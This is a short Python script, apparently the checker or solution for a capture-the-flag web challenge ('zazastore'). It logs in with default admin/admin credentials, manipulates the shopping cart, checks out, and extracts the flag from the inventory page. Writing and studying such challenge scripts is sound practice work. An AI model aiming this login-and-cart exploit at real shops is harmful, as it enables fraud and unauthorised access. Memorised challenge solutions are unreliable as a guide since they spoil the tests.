#!/usr/bin/env python3

import os, re
import requests
import logging
logging.disable()

URL = os.environ.get("URL", "http://zazastore.ctf.pascalctf.it")
if URL.endswith("/"):
   URL = URL[:-1]

def checker():
   session = requests.Session()
   session.post(f"{URL}/login", data={"username": "admin", "password": "admin"})
   session.post(f"{URL}/add-cart", data={"product": "SusZa", "quantity": "1"})
   session.post(f"{URL}/add-cart", data={"product": "RealZa", "quantity": "1"})
   session.post(f"{URL}/checkout")
   r = session.get(f"{URL}/inventory")
   flag = re.search(r"pascalCTF{.*?}", r.text)
   if flag:
      flag = flag.group()

   return flag

if __name__ == "__main__":
   print(checker())
